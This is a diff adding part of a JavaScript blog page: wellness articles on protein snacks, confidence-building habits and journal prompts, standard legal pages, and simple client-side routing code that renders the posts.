+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">10. Steamed Edamame with Coarse Sea Salt (100 Cal | 11g Protein)</h3>
+<p>Edamame, or young soybeans, are an exceptional plant-based protein source. Steam a half-cup of edamame pods and sprinkle with coarse sea salt. Eating edamame is a slow, mindful process because you have to shell each bean, which helps prevent mindless overeating and promotes fullness.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">11. Organic Low-Fat String Cheese (80 Cal | 7g Protein)</h3>
+<p>String cheese is a convenient, pre-portioned snack that is highly satisfying. One piece of low-fat mozzarella string cheese contains only 80 calories while delivering 7 grams of protein and a healthy dose of bone-supporting calcium. It is an ideal, budget-friendly option for busy workdays.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">12. Low-Sugar Protein Bar (180 Cal | 12g Protein)</h3>
+<p>When you are traveling or stuck in meetings, a high-quality, low-sugar protein bar is a lifesaver. Look for bars with under 5 grams of sugar and at least 12 grams of protein. These bars keep your energy levels steady and prevent you from turning to processed vending machine snacks when your schedule gets chaotic.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Calorie and Protein Summary</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Turkey Roll-Ups:</strong> 150 Calories | 18g Protein - High protein, ultra-low carb.</li>
+    <li><strong>Cottage Cheese & Tomatoes:</strong> 120 Calories | 14g Protein - Slow digestion, high calcium.</li>
+    <li><strong>Edamame with Sea Salt:</strong> 100 Calories | 11g Protein - Excellent plant-based choice.</li>
+    <li><strong>Low-Fat String Cheese:</strong> 80 Calories | 7g Protein - Lowest calorie count, perfect on the go.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+<p>Successful fat loss is not about starving yourself; it is about fueling your body with high-volume, nutrient-dense choices. By planning ahead and surrounding yourself with these 12 smart, protein-rich snack options, you can easily control hunger pangs, maintain lean muscle mass, and build sustainable habits. Swap out high-sugar, processed treats for these high-protein alternatives, and watch your consistency turn into beautiful, long-term physical results.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Fat Loss Snacks</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Low Calorie</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">High Protein</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Eating</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Weight Loss Tips</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Meal Prep</span>
+</div>
+`
+            },
+            {
+                id: 'boost-confidence-self-care',
+                title: '12 Ways to Boost Confidence and Self-Esteem Through Wellness',
+                date: 'June 4, 2026',
+                image: './assets/12-ways-to-boost-confidence-and-self-esteem-through-wellness.png',
+                excerpt: 'True confidence is a journey of how you treat your mind, body, and heart every day. ✨ Cultivate self-worth, reduce self-doubt, and feel comfortable in your own skin with this wellness and self-care roadmap! Explore 12 daily habits like physical movement, nourishing food, boundaries, and mindfulness to build an unwavering foundation of self-belief. \n\n• Learn to shift your internal dialogue through self-compassion and small wins.\n• Establish clear boundaries to protect your mental energy and inner peace.\n\nSave for later! #SelfConfidence #SelfEsteem #WellnessTips #SelfCareDaily #MindsetShift #PersonalGrowth',
+                content: `
+<p>Self-confidence and self-esteem are not fixed traits that you are either born with or without. Rather, they function like muscles that require daily training, nourishment, and attention. Real, lasting confidence is built through the small, repetitive choices you make each day regarding how you treat your mind, body, and emotional wellness. By establishing a holistic self-care routine that honors your physical needs and transforms your internal dialogue, you can build an unshakeable foundation of self-belief.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>True confidence is cultivated internally, not through external validation or praise.</li>
+    <li>Physical wellness directly impacts mental resilience; a healthy body supports a strong mind.</li>
+    <li>Practicing daily self-compassion reduces performance anxiety and alleviates fear of failure.</li>
+    <li>Protecting your mental peace by setting clear boundaries is an act of deep self-respect.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Intersection of Physical Wellness and Inner Self-Belief</h2>
+
+<p>Your physiology and psychology are intricately connected. When you neglect your physical body—through poor sleep, chronic dehydration, or physical inactivity—your brain interprets this neglect as a sign of low self-worth. Conversely, treating your body with care sends a powerful message to your subconscious that you are valuable and deserving of attention. Wellness habits trigger a cascade of positive neurochemicals like endorphins, dopamine, and serotonin, which naturally lift your mood and quiet your inner critic.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> You do not have to be perfect to be highly confident. True self-esteem is about embracing your current progress while showing up consistently to care for your health.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">6 Core Habits to Build Your Physical Foundation</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Move Your Body Daily</h3>
+<p>Physical movement is a powerful tool for resetting your nervous system. Whether you prefer yoga, morning walks, stretching, or heavy strength training, every single active minute counts. Physical exercise reduces cortisol levels (the body's stress hormone) while boosting your overall energy, focus, and self-belief. It helps you focus on what your body is capable of doing rather than just how it looks.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Nourish Your Body with Intention</h3>
+<p>Food is fuel for both your brain and your physical organs. Intentionally choose whole, nutrient-dense foods that make you feel strong and vibrant rather than lethargic. Fueling yourself with quality proteins, complex carbs, and colorful vegetables is an act of self-respect that keeps your mind sharp and your emotional baseline stable.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Practice Gentle Self-Compassion</h3>
+<p>The relationship you have with yourself is the longest one you will ever experience. Be kind to yourself when you make mistakes, speaking to yourself as you would to a beloved friend. Remind yourself that you are fully worthy of love and respect exactly as you are today, regardless of your daily productivity levels.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> When you catch yourself using harsh self-talk, pause and ask: "Would I say this to a friend?" If the answer is no, rephrase your thought with kindness.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Calm Your Mind</h3>
+<p>An anxious, overstimulated brain is highly susceptible to doubt and negative comparisons. Dedicate time each day to quiet your mind. Practicing meditation, gentle breathwork, or structured journaling helps quiet external noise, build inner trust, and allow you to hear your own authentic voice.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Stay Deeply Hydrated</h3>
+<p>Dehydration causes fatigue, brain fog, headaches, and skin dullness. Drinking plenty of water supports your natural energy levels, mental clarity, and skin health. Keeping a water bottle by your side is a small, simple habit that has a massive positive impact on your daily physical performance.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Prioritize Restorative Sleep</h3>
+<p>Sleep is when your physical body heals, your brain processes emotions, and your cognitive function restores. Create a relaxing evening routine, limit screen time before bed, and protect your sleep environment. High-quality rest leaves you feeling clear-headed and confident each morning.</p>
+
+<div style="background:rgba(45, 74, 67, 0.03);border:1px solid #e5dfd3;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Daily Mindset Shift</h3>
+  <p>Confidence is not something you magically acquire once you reach a specific goal; it is a mindset you practice along the way. Committing to small daily wellness habits proves to your brain that you are dependable, building deep-seated self-trust that external achievements can never duplicate.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">6 Mental & Social Practices for Unshakeable Self-Esteem</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">7. Set Healthy Boundaries</h3>
+<p>Your time and energy are highly precious resources. Setting boundaries—such as politely declining extra tasks or limiting toxic interactions—is a crucial form of self-care. Saying "no" to things that drain your spirit is a powerful way of saying "yes" to your own health and peace of mind.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">8. Celebrate Your Small Wins</h3>
+<p>Do not wait for a massive milestone to feel proud of your progress. Cultivate the habit of celebrating small, daily achievements—such as drinking enough water, completing a project task, or speaking up in a meeting. Recognizing your effort builds a positive cycle of motivation.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">9. Dedicate Time to Self-Care</h3>
+<p>Incorporate small rituals into your week that promote relaxation and self-respect. Whether it is a soothing skincare routine, taking warm baths, or enjoying a quiet morning cup of tea, these self-care acts show that you prioritize your well-being.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">10. Surround Yourself with Positive People</h3>
+<p>You naturally adapt to the energy of your social circle. Choose to spend time with people who uplift, inspire, and support your personal growth. Cultivating positive, authentic relationships creates a safe space for you to thrive and be yourself.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">11. Focus on Your Unique Strengths</h3>
+<p>Comparison is the thief of joy and the destroyer of self-esteem. Stop measuring your progress against someone else's highlight reel. Focus on your unique talents, perspective, and values, and remember that your personal path is entirely your own.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">12. Be Patient with Your Journey</h3>
+<p>Building genuine confidence takes time, and your self-esteem will naturally fluctuate. Treat yourself with patience and understanding on difficult days. Keep showing up for yourself, because consistence is what builds unshakeable, lasting strength.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Wellness Habits</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Daily Movement:</strong> Lowers stress hormones and improves cognitive focus.</li>
+    <li><strong>Mindful Nutrition:</strong> Feeds brain cells and keeps emotional baselines steady.</li>
+    <li><strong>Setting Boundaries:</strong> Protects your mental energy from burn-out.</li>
+    <li><strong>Self-Compassion:</strong> Builds resilience against mistakes and setbacks.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+<p>Unshakeable self-confidence is not a destination; it is a beautiful, daily commitment to your own physical and mental well-being. By embracing these 12 practical wellness and self-care habits, you show yourself the deep respect you deserve. Focus on small, steady changes, celebrate your personal growth, and trust that as you care for your body and mind, your inner confidence will naturally shine.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Confidence</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Wellness Habits</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Mindset Shift</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Personal Growth</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Mental Peace</span>
+</div>
+`
+            },
+            {
+                id: 'journal-prompts-reflection',
+                title: '6 Powerful Journal Prompts for Self Reflection and Healing',
+                date: 'May 28, 2026',
+                image: './assets/6-powerful-journal-prompts-for-self-reflection-and-healing.png',
+                excerpt: 'Journaling is one of the most therapeutic ways to navigate your emotions, heal from past wounds, and connect deeply with your true self. ✍️ This gentle guide offers six life-changing journal prompts specifically designed to facilitate emotional healing, foster self-compassion, and map out your dream life. \n\n• Explore gentle, guided prompts to unpack heavy feelings and release what no longer serves you.\n• Fosters a healing space to recognize your progress and plan your future with intention.\n\nSave for later! #JournalPrompts #SelfReflection #EmotionalHealing #MentalHealthMatters #MindfulnessJournal #SelfDiscovery',
+                content: `
+<p>In a world of constant digital noise and endless external demands, finding the space to connect with your authentic self can be challenging. Journaling serves as a powerful, therapeutic sanctuary for your mind. Putting pen to paper allows you to step out of the daily rush, process complex emotions, and heal from past wounds. By engaging in structured, reflective writing, you can gain deep insights, quiet your anxiety, and map out a purposeful future with clarity.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Journaling acts as an emotional release valve, reducing mental clutter and stress.</li>
+    <li>Honest writing helps you identify behavioral patterns and emotional triggers.</li>
+    <li>Reflective prompts guide you through processing complex feelings without judgment.</li>
+    <li>Establishing a regular writing routine strengthens your connection to your core values.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Science and Healing Power of Expressive Writing</h2>
+
+<p>Research in psychological science demonstrates that expressive writing—the practice of writing down your deepest thoughts and feelings—has measurable benefits for both mental and physical health. Writing down your experiences helps transition your brain out of a state of chronic stress, organizing chaotic memories into a coherent, structured story. This cognitive shift makes heavy feelings feel more manageable and helps your mind release lingering tension.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> You do not need to be an accomplished writer or worry about perfect grammar when journaling. Write freely and authentically, allowing your raw thoughts to flow without self-censorship.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">6 Gentle prompts for Deep Self-Reflection</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Prompt 1: What am I feeling right now, and why?</h3>
+<p>We often carry a heavy mix of emotions without taking the time to name them. Pause, close your eyes, and ask yourself what is currently present in your heart. Are you feeling anxious, excited, overwhelmed, or tired? Name these emotions on the page without judging them. Remember, naming an emotion is the first and most crucial step toward understanding and healing it.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Prompt 2: What do I need more of in my life?</h3>
+<p>Be completely honest with yourself. Are you craving quiet, playfulness, physical rest, creative expression, or deeper connection? Explore what feels missing from your current routine, and consider how you can gently invite those nourishing elements back into your days.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Prompt 3: What am I ready to let go of?</h3>
+<p>Identify what no longer serves your growth. It could be a limiting belief, an unhealthy habit, a toxic relationship dynamic, or an old resentment. Write down these heavy burdens and commit to releasing them, clearing space for fresh, positive energy to enter your life.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Create a cozy, soothing environment for your journaling—light a candle, play soft music, and make a warm cup of tea to signal to your nervous system that you are in a safe space.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Prompt 4: What makes me feel truly alive?</h3>
+<p>Reflect on the activities, conversations, and environments that spark joy in your heart. When do you feel most connected, creative, and vibrant? Commit to doing more of those life-giving things, ensuring your daily schedule reflects what brings you happiness.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Prompt 5: What am I proud of myself for?</h3>
+<p>We are often quick to criticize ourselves and slow to acknowledge our growth. Shift your focus to your successes, both big and small. Celebrate your progress, the challenges you have overcome, and the kindness you have shown. Write down these victories to build deep self-belief.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Prompt 6: Where do I see myself in one year?</h3>
+<p>Allow yourself to dream, believe, and plan. If there were no limitations, what would your daily life look like in twelve months? Write down this vision in detail—focusing on your career, health, relationships, and emotional state—and take a small step toward making it a reality.</p>
+
+<div style="background:rgba(45, 74, 67, 0.03);border:1px solid #e5dfd3;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">A Gentle Reminder</h3>
+  <p>You are allowed to be both a work in progress and a masterpiece at the same time. Growth is not a linear journey, and healing takes patience. Allow your journal to be a safe, loving space where all versions of you are welcome and appreciated.</p>
+</div>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Prompt Focus Areas</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Emotional Check-in:</strong> Prompt 1 explores your current emotional state.</li>
+    <li><strong>Needs & Alignment:</strong> Prompts 2 & 4 help align your schedule with your values.</li>
+    <li><strong>Releasing Burden:</strong> Prompt 3 focuses on letting go of what limits your potential.</li>
+    <li><strong>Gratitude & Future:</strong> Prompts 5 & 6 celebrate your growth and plan your next steps.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+<p>Reflective journaling is a beautiful, transformative journey of self-discovery. By setting aside ten minutes each day to answer these six gentle prompts, you cultivate deeper self-awareness, process your feelings, and design a lifestyle that honors your authentic self. Keep writing, stay curious, and trust that your journal is always a safe place to return to as you heal, learn, and grow.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Journal Prompts</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Reflection</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Emotional Healing</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Mental Health</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Discovery</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Mindfulness Journal</span>
+</div>
+`
+            }
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>Self Growth & Success Tips</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At Self Growth & Success Tips, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+                    
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Self Growth & Success Tips";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // Placeholder avatar URL
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p style="white-space: pre-line;">${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+            if (!page) {
+                app.innerHTML = `<p style="color: var(--text-dark);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+            if (!post) {
+                app.innerHTML = `<p style="color: var(--text-dark);">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
